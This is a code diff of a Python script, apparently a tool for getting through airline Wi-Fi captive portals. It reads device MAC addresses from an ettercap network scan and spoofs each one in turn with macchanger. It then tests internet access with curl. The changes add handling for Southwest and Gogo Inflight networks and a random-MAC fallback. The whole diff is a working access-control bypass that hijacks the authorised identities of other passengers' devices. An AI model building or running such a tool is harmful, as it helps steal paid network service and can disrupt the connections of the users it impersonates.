@@ -20,24 +20,50 @@ def waitForAndCheckInternet():
         time.sleep(interval)
 
     # check a known 200 response from CURL
-    # sometimes this can randomly take a while so retry if > 5 seconds
-    # if we've been doing this for > 30 seconds, someting bad happened
-    for loopCounter in range(12):
+    # sometimes this can randomly take a while so retry if > 6 seconds
+    # if we've been doing this for > 60 seconds, someting bad happened
+    for loopCounter in range(5):
+        '''
+            Southwest airlines:
+                curl -I works
+                result.returncode == 0 for both normal and redirect
+            Gogo Inflight (United):
+                curl -I hangs
+                result.returncode == 56 on redirect
+        '''
         try:
-            result = subprocess.run(('curl', '-I', 'neverssl.com'),
-                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=5)
+            #print("accessing neverssl.co via curl...")
+            # while preferable, calling "curl -I" hangs on gogoinflight
+            #result = subprocess.run(('curl', '-I', 'neverssl.com'),
+            result = subprocess.run(('curl', 'http://neverssl.com/'),
+                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=6)
             if result.returncode == 0:
+                # this happens on southwest airlines
+                #print("successful response acquired")
                 break
+            if result.returncode == 56:
+                # united (gogo inflight)
+                break
+            #print("unsuccessful curl response")
             time.sleep(increment)
         except:
             # curl timed out? try again
+            #print("curl timeout")
             pass
-    return result.stdout[:15] == b'HTTP/1.0 200 OK'
+    try:
+        return result.stdout[:15] == b'HTTP/1.0 200 OK'
+    except:
+        print("    Connection timeout")
+        return False
+
 
 def resetInterface(mac):
     subprocess.run(('service', 'network-manager', 'stop'), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     if mac:
-        subprocess.run(('macchanger', '-m', mac, iface), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        if mac == 'random':
+            subprocess.run(('macchanger', '-a', iface), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        else:
+            subprocess.run(('macchanger', '-m', mac, iface), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     subprocess.run(('service', 'network-manager', 'start'), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def run(candidates, keepGoing=False):
@@ -59,17 +85,28 @@ def run(candidates, keepGoing=False):
         selected = valid[int(random.random() * len(valid))]
         print("\nUsing: {}".format(selected))
         resetInterface(valid[0])
+    else:
+        print("\nNo MACs with access to the Internet found. Randomizing.")
+        resetInterface('random')
 
-# for now, hardcode these values
+
+# for now, this values
 keepGoing = True
-iface = 'wlp58s0'
+
+# TODO: proper argparse etc.
+try:
+    iface = sys.argv[1]
+    hosts_file = sys.argv[2]
+except:
+    print("Usage: {} interface hostsfile".format(sys.argv[0]))
+    sys.exit(1)
 
 # for now, read hosts file from ettercap host scan output
-with open('/tmp/hosts') as file:
+with open(hosts_file) as file:
     macs = []
     lines = file.readlines()
     for entry in lines:
         parts = entry.split()
         macs.append(parts[1])
-    # run in reverse, and skip the last (originally first) two since these tend to be the gateway stuff
-    run(macs[:1:-1], keepGoing=keepGoing)
+    # run in reverse
+    run(macs[::-1], keepGoing=keepGoing)
